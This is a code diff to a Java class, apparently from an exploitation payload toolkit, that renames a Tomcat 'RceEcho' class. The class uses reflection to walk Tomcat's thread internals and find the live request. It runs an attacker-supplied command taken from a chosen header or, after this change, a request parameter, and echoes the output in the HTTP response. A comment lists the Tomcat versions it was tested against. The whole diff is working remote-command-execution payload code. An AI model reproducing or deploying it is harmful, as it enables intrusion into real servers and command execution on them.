@@ -8,13 +8,30 @@ import java.lang.reflect.Field;
 
 /**
  * @author Whoopsunix
+ * <p>
+ * use https://github.com/c0ny1/java-object-searcher
+ * TargetObject = {org.apache.tomcat.util.threads.TaskThread}
+ * ---> group = {java.lang.ThreadGroup}
+ * ---> threads = {class [Ljava.lang.Thread;}
+ * ---> [13] = {java.lang.Thread}
+ * ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
+ * ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
+ * ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
+ * ---> global = {org.apache.coyote.RequestGroupInfo}
+ *
+ * Version test
+ * 6.0.53
+ * 7.0.59、7.0.109
+ * 8.0.53、8.5.82
+ * 9.0.65
  */
 @Middleware(Middleware.Tomcat)
-@JavaClassModifiable(JavaClassModifiable.HEADER)
-public class TomcatRceEcho {
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+public class TomcatRE {
     private static String HEADER;
+    private static String PARAM;
 
-    public TomcatRceEcho() {
+    public TomcatRE() {
         try {
             ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
             Field field = threadGroup.getClass().getDeclaredField("threads");
@@ -45,20 +62,27 @@ public class TomcatRceEcho {
                     Object req = getFieldValue(processor, "req");
                     Object response = req.getClass().getMethod("getResponse").invoke(req);
                     String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
+                    Object parameters = getFieldValue(req, "parameters");
+                    String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
+
+                    String result = null;
                     if (header != null) {
-                        String result = exec(header);
-                        // doWrite
-                        response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
-                        try {
-                            response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
-                        } catch (NoSuchMethodException e) {
-                            Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-                            Object byteChunk = clazz.newInstance();
-                            clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
-                            response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
-                        }
-                        return;
+                        result = exec(header);
+                    } else if (param != null) {
+                        result = exec(param);
                     }
+
+                    // doWrite
+                    response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
+                    try {
+                        response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
+                    } catch (NoSuchMethodException e) {
+                        Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                        Object byteChunk = clazz.newInstance();
+                        clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
+                        response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
+                    }
+                    return;
                 }
 
             }
